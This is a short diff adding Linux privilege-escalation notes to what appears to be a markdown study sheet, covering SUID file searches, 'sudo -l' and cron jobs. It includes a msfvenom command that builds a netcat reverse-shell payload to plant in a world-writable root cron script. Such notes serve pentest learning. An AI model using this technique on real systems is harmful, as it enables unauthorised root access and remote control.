@@ -28,3 +28,17 @@
 it becomes SUID (rws-rwx-rwx) and when bit “2” is set to group it becomes SGID (rwx-rws-rwx).
 #### Check for files with the SUID/GUID bit - can be run with the permissions of the file owner/group
 #### `find / -perm -u=s -type f 2>/dev/null`
+
+# Other means of priv-esc
+
+## Processes
+#### `sudo -l` to list commands usable as a super user on that account (if any). 
+
+## crontab
+#### Long-running process that executes commands at specific dates and times. Found in `cat /etc/crontab`
+#### Format:
+`m   h dom mon dow user  command`
+`17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly`
+#### Check for files run as root but that can be written to by anyone/you. Edit file to execte shell for example with msfvenom:
+`msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`
+#### write payload to task set to run in cron
